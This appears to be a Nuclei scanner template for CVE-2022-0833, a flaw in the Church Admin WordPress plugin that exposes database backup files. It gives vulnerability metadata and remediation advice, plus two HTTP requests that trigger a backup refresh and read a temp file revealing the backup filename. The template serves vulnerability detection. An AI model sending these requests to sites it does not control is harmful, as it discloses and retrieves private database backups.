id: CVE-2022-0833

info:
  name: Church Admin Plugin Backup Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  description: The Church Admin WordPress plugin before 3.4.135 does not have authorisation and CSRF in some of its actions as well as requested files, allowing unauthenticated attackers to disclose the final backup filename and download the backup of the plugin's DB data.
  impact: |
    Potential exposure of sensitive information stored in backup files.
  remediation: |
    Update the Church Admin Plugin to the latest version to mitigate the vulnerability.
  reference:
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/cyllective/CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cve-id: CVE-2022-0833
    cwe-id: CWE-352
    epss-score: 0.00092
    epss-percentile: 0.40778
    cpe: cpe:2.3:a:church_admin_project:church_admin:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: church_admin_project
    product: church_admin
    framework: wordpress

http:
  - method: GET
    path:
      - "{{BaseURL}}/?action=refresh-backup"

    matchers:
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/uploads/church-admin-cache/temp.sql"

    matchers:
      - type: word
        words:
          - ".sql.gz"
        part: body
